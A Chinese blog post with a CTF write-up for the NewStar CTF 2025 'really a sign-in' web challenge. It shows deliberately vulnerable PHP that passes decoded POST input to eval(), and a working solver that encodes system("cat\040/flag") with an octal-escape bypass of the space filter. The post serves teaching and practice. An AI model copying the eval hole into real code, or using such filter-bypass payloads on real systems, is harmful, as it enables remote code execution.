---
abbrlink: 414c601b
title: 'NewStar CTF 2025 Week2-Web真的是签到诶'
categories:
  - 
date: 2026-03-18 21:34:33
---
# NewStar CTF 2025 Week2-Web真的是签到诶



一开始一直在错，脚本怎么写都不对，

看了以下很多大佬的题解比较简单，

于是自己琢磨整个题解

源代码：

```
 <?php
highlight_file(__FILE__);

$cipher = $_POST['cipher'] ?? '';

function atbash($text) {
  $result = '';
  foreach (str_split($text) as $char) {
    if (ctype_alpha($char)) {
      $is_upper = ctype_upper($char);
      $base = $is_upper ? ord('A') : ord('a');
      $offset = ord(strtolower($char)) - ord('a');
      $new_char = chr($base + (25 - $offset));
      $result .= $new_char;
    } else {
      $result .= $char;
    }
  }
  return $result;
}

if ($cipher) {
  $cipher = base64_decode($cipher);
  $encoded = atbash($cipher);
  $encoded = str_replace(' ', '', $encoded);	//去空格函数
  $encoded = str_rot13($encoded);
  @eval($encoded);
  exit;
}

$question = "真的是签到吗？";
$answer = "真的很签到诶！";

$res =  $question . "<br>" . $answer . "<br>";
echo $res . $res . $res . $res . $res;

?> 
```

### 1.出错点：空格

其实就是三个加密，怎么进去怎么出来

函数的逻辑就这样了

但是这里有一个点就是空格，因为我们原本命令里面有空格

假设我们正确传进去了一个字符串，按照代码逻辑我们在base64解码之后，就会出现空格，但是这里会被后面 去空格函数 给影响，因为没有空格了`cat /flag`-->`cat/flag`

**解决方法**：\040绕过

```
system("cat\040/flag");
```

由于eval，里面的内容会被当成php代码执行

而PHP 处理双引号字符串时，会自动扫描里面的反斜杠 `\`。

当它看到 `\040`，它会立刻在内存中把它转换成一个 **空格字符 (ASCII 32)**

### 2.注意rot13和atbash都是对称加密，所以我们就不用改变函数自身了

```
<?php
// 1. 照抄（因为它是对称的）
function atbash($text) {
    $result = '';
    foreach (str_split($text) as $char) {
        if (ctype_alpha($char)) {
            $is_upper = ctype_upper($char);
            $base = $is_upper ? ord('A') : ord('a');
            $offset = ord(strtolower($char)) - ord('a');
            $new_char = chr($base + (25 - $offset));
            $result .= $new_char;
        } else {
            $result .= $char;
        }
    }
    return $result;
}

// 2. 使用 \040 绕过空格过滤
// 040是八进制的空格
$target = 'system("cat\040/flag");'; 

// 3. 逆向加密
$step1 = str_rot13($target); 
$step2 = atbash($step1);   
$final = base64_encode($step2); 

echo $final;
?>
```

